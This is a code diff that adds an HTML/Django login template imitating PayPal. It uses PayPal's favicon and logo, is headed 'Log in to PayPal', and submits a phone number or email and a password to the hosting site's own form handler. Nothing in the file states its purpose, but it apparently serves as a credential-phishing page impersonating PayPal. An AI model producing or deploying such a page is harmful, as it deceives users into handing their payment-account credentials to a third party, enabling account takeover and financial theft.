@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+        <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #f6f6f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px 20px;
+            max-width: 380px;
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .login-container button:hover {
+            background-color: #005ea6;
+        }
+
+        .login-container a {
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #0070ba;
+            text-decoration: none;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+
+        .login-container .secondary-links {
+            margin-top: 30px;
+        }
+
+        .secondary-links a {
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        /* Mobile Responsive Adjustments */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+            }
+
+            .login-container img {
+                width: 100px;
+            }
+
+            .login-container h2 {
+                font-size: 20px;
+            }
+
+            .login-container input, .login-container button {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- PayPal Logo (you can replace it with a similar logo) -->
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+
+        <!-- Form heading -->
+        <h2>Log in to PayPal</h2>
+
+        <!-- Login form -->
+        <form method="POST" action="">
+            {% csrf_token %}
+            <input type="text" placeholder="Phone number or Email" name="contact" required>
+            <input type="password" placeholder="Password" name="password" required>
+            <button type="submit">Log In</button>
+        </form>
+
+        <!-- Secondary links -->
+        <div class="secondary-links">
+            <a href="#">Having trouble logging in?</a>
+            <a href="#">Sign Up</a>
+        </div>
+    </div>
+
+</body>
+
+
+</html>
+
